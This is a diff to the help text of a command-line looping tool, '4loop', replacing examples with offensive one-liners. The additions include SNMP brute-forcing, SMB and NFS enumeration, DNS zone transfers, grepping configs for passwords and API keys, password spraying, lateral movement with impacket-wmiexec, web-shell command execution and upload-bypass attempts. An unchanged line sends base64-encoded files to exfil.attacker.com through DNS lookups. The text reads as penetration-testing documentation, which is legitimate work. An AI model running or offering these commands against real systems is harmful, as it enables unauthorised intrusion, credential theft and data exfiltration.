@@ -121,8 +121,8 @@ def show_examples_help():
   {c.dim('# Process each line of a file')}
   {c.cmd('4loop \'echo "Processing: LINE"\' data.txt')}
   
-  {c.dim('# Count lines while processing')}
-  {c.cmd('4loop \'wc -l LINE\' *.txt')}
+  {c.dim('# Check HTTP status codes')}
+  {c.cmd('4loop \'curl -o /dev/null -s -w "%{http_code}\\n" LINE\' urls.txt')}
   
   {c.dim('# Validate URLs from a list')}
   {c.cmd('4loop \'curl -I LINE | head -1\' urls.txt 1s')}
@@ -185,8 +185,8 @@ def show_examples_help():
   {c.cmd('# Port scan with retry')}
   {c.cmd('4loop \'nmap -p LINE2 LINE1 || nmap -p LINE2 LINE1\' hosts.txt ports.txt 2s')}
   
-  {c.cmd('# DNS enumeration')}
-  {c.cmd('4loop \'host LINE1.target.com LINE2\' subdomains.txt dns_servers.txt')}
+  {c.cmd('# DNS zone transfer attempts')}
+  {c.cmd('4loop \'dig @LINE1 LINE2 AXFR\' dns_servers.txt domains.txt')}
   
   {c.cmd('# Service discovery')}
   {c.cmd('4loop \'curl -X POST LINE1:LINE2/api/v1/status\' hosts.txt ports.txt')}
@@ -198,8 +198,8 @@ def show_examples_help():
   {c.cmd('# Database operations')}
   {c.cmd('4loop \'mysql -e "INSERT INTO logs VALUES (LINE)"\' data.csv')}
   
-  {c.cmd('# Log analysis')}
-  {c.cmd('4loop \'grep ERROR LINE | wc -l\' /var/log/*.log')}
+  {c.cmd('# Search for sensitive patterns')}
+  {c.cmd('ls *.conf | 4loop \'grep -E "password|api_key|secret" LINE\' INPUT')}
 
 {c.bold('Automation Chains')}
   {c.cmd('# Multi-stage processing')}
@@ -341,15 +341,25 @@ def show_pentesting_help():
 
 {c.bold('═══ RECONNAISSANCE ═══')}
 
+{c.bold('Service Enumeration')}
+  {c.dim('# NFS shares enumeration (port 2049)')}
+  {c.cmd('4loop \'showmount -e LINE\' port-2049.txt')}
+  
+  {c.dim('# SMB shares enumeration')}
+  {c.cmd('4loop \'smbclient -L //LINE -N 2>&1 | grep -E "Disk|IPC"\' port-445.txt')}
+  
+  {c.dim('# SNMP community string brute-force')}
+  {c.cmd('4loop \'snmpwalk -v2c -c LINE2 LINE1 system\' port-161.txt communities.txt 0.5s')}
+
 {c.bold('Subdomain Enumeration')}
-  {c.dim('# Check multiple subdomain lists against multiple domains')}
-  {c.cmd('4loop \'dig +short LINE1.LINE2\' subdomains.txt domains.txt | grep -v "^$"')}
+  {c.dim('# Check subdomains against multiple domains')}
+  {c.cmd('4loop \'dig +short LINE1.LINE2 | grep -v "^$"\' subdomains.txt domains.txt')}
   
-  {c.dim('# Verify subdomains with specific DNS servers')}
-  {c.cmd('4loop -c \'dig @LINE2 LINE1.target.com +short\' subdomains.txt dns_servers.txt')}
+  {c.dim('# Virtual host discovery')}
+  {c.cmd('4loop \'curl -H "Host: LINE.target.com" http://10.10.10.10 -s -o /dev/null -w "%{http_code}\\n"\' vhosts.txt')}
   
-  {c.dim('# HTTPS certificate checking')}
-  {c.cmd('4loop \'echo | openssl s_client -connect LINE:443 2>/dev/null | grep subject\' domains.txt')}
+  {c.dim('# SSL certificate CN/SAN extraction')}
+  {c.cmd('4loop \'echo | timeout 1 openssl s_client -connect LINE:443 2>/dev/null | openssl x509 -noout -text | grep DNS:\' ips.txt')}
 
 {c.bold('Port Scanning')}
   {c.dim('# Distributed scanning across jump hosts')}
@@ -365,10 +375,10 @@ def show_pentesting_help():
 
 {c.bold('Password Spraying')}
   {c.dim('# Single password against all users (avoid lockouts)')}
-  {c.cmd('4loop \'crackmapexec smb target.com -u LINE -p Winter2024!\' users.txt 5s')}
+  {c.cmd('4loop \'crackmapexec smb target.com -u LINE -p Winter2025!\' users.txt 30s')}
   
-  {c.dim('# Spray across multiple targets')}
-  {c.cmd('4loop \'hydra -l admin -p LINE1 LINE2 ssh\' passwords.txt targets.txt 2s')}
+  {c.dim('# Spray passwords across multiple targets')}
+  {c.cmd('4loop \'hydra -l admin -p LINE1 ssh://LINE2\' passwords.txt targets.txt 2s')}
   
   {c.dim('# Time-delayed spraying to avoid detection')}
   {c.cmd('4loop \'smbclient -L //LINE -U guest%password 2>/dev/null\' targets.txt 30s')}
@@ -378,7 +388,7 @@ def show_pentesting_help():
   {c.cmd('4loop -z \'hydra -l LINE1 -p LINE2 ftp://target.com\' users.txt passwords.txt 1s')}
   
   {c.dim('# With proxy rotation')}
-  {c.cmd('4loop -z \'curl --proxy LINE2 -d "user=LINE1&pass=LINE1" https://target/login\' creds.txt proxies.txt')}
+  {c.cmd('4loop -c \'curl --proxy LINE2 -d "user=LINE1&pass=LINE2" https://target/login\' creds.txt proxies.txt')}
   
   {c.dim('# NTLM authentication testing')}
   {c.cmd('4loop -z \'curl --ntlm -u "LINE1:LINE2" http://sharepoint.local\' users.txt passwords.txt')}
@@ -421,8 +431,8 @@ def show_pentesting_help():
   {c.dim('# SSH key reuse')}
   {c.cmd('4loop \'ssh -o BatchMode=yes -i private_key LINE "hostname"\' discovered_hosts.txt 2s')}
   
-  {c.dim('# PSExec across network')}
-  {c.cmd('4loop \'impacket-psexec admin:password@LINE\' windows_hosts.txt')}
+  {c.dim('# PSExec/WMIExec across network')}
+  {c.cmd('4loop \'impacket-wmiexec domain/admin:password@LINE\' windows_hosts.txt')}
 
 {c.bold('Data Exfiltration')}
   {c.dim('# Distribute exfil across multiple channels')}
@@ -431,17 +441,17 @@ def show_pentesting_help():
   {c.dim('# DNS exfiltration')}
   {c.cmd('4loop \'dig $(base64 LINE | tr -d "\\n").exfil.attacker.com\' sensitive_data.txt 2s')}
 
-{c.bold('═══ DEFENSIVE TESTING ═══')}
+{c.bold('═══ EXPLOITATION ═══')}
 
-{c.bold('Security Monitoring')}
-  {c.dim('# Test detection rules')}
-  {c.cmd('4loop \'curl -A "LINE" http://honeypot.local\' malicious_user_agents.txt 10s')}
+{c.bold('Web Shell Interaction')}
+  {c.dim('# Command execution through web shells')}
+  {c.cmd('4loop \'curl -X POST -d "cmd=LINE" http://target.com/shell.php\' commands.txt')}
   
-  {c.dim('# Verify firewall rules')}
-  {c.cmd('4loop \'nc -zv protected.host LINE 2>&1\' blocked_ports.txt | grep -v succeeded')}
+  {c.dim('# File upload bypass attempts')}
+  {c.cmd('4loop \'curl -F "file=@shell.php;filename=shell.LINE" http://target.com/upload\' extensions.txt')}
   
-  {c.dim('# IDS/IPS testing')}
-  {c.cmd('4loop \'curl "http://waf.test/PAGE?test=LINE"\' ids_test_payloads.txt 5s')}
+  {c.dim('# XXE/SSRF payload testing')}
+  {c.cmd('4loop \'curl -X POST -H "Content-Type: text/xml" -d "LINE" http://api.target/parse\' xxe_payloads.txt')}
 
 {c.bold('═══ USEFUL COMBINATIONS ═══')}
 
